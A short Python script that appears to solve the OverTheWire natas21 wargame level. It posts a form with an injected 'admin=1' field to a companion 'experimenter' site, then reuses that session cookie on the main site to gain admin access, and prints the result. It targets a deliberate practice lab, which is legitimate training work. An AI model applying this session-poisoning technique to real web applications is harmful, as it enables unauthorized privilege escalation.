import requests
from requests.auth import HTTPBasicAuth

username = 'natas21'

auth = HTTPBasicAuth('natas21', 'wherethepassword')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

url = "http://natas21-experimenter.natas.labs.overthewire.org/?debug"
crossurl = "http://natas21.natas.labs.overthewire.org/index.php"

payload= {"allign" : "center", "fontsize" : "100%", "bgcolor" : "red", "submit" : "Update", "admin" : "1"}
response=requests.post(url, data=payload, headers=headers, auth=auth, verify=False)
cookies = response.cookies.get_dict()

getresponse = requests.get(crossurl, auth=auth, headers=headers, cookies=cookies)

print(getresponse.text)

